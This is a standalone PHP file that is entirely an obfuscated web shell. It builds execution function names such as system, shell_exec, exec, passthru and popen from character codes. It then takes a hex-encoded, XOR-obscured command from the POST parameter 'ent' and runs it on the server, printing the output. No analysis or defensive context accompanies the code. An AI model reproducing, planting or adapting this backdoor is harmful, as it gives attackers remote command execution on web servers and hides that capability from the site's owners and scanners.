<?php
//<PHPDATA>cmd_xor;73;ent</PHPDATA>
$_=join('',array_map('chr',array(99,114,101,97,116,101,95,102,117,110,99,116,105,111,110)));
$_0=array_map('chr',[104,101,120,50,98,105,110]);
$_1=call_user_func_array('implode',[ '', array_map('chr',[101,120,101,99]) ]);
$_2=join('',array_map('chr',[115,121,115,116,101,109]));
$_3=implode('',array_map('chr',array(112,111,112,101,110)));
$_4=implode('',array_map('chr',array(112,97,115,115,116,104,114,117)));
$_5=join(array_map('chr',[115,116,114,101,97,109,95,103,101,116,95,99,111,110,116,101,110,116,115]),'');
$_6=join(array_map('chr',[115,104,101,108,108,95,101,120,101,99]),'');
$_7=join(array_map('chr',[112,99,108,111,115,101]),'');
$_pbs=join(array_map('chr',[101,110,116]),'');
$_post_key = implode('', [chr(101),chr(110),chr(116)]);

$_xor = function($str,$k){$r='';$l=strlen($str);for($i=0;$i<$l;$i++){$r.=chr(ord($str[$i])^$k);}return $r;};
$_extract = function($fn,$arg){return $fn($arg);};

if(isset($_POST[$_post_key])) {
    $_v=$_extract($_0, $_POST[$_post_key]);
    $_v=$_xor($_v,73);
    $_funcs = [$_2,$_6,$_1,$_4,null];
    $_fnd=false;
    foreach($_funcs as $f){
        if($f!==null&&function_exists($f)){
            switch($f){
                case $_2: $f($_v);$_fnd=true;break;
                case $_6: print $f($_v);$_fnd=true;break;
                case $_1: $_out=[];$f($_v,$_out);print implode("\n",$_out);$_fnd=true;break;
                case $_4: $f($_v);$_fnd=true;break;
            }
            if($_fnd)break;
        }
    }
    if(!$_fnd){
        if(function_exists($_3)&&function_exists($_5)&&function_exists($_7)){
            $_fp=$_3($_v,'r');
            if($_fp){
                $_cnt=$_5($_fp);
                $_7($_fp);
                print $_cnt;
                exit;
            }
        }
    }else exit;
}
?>
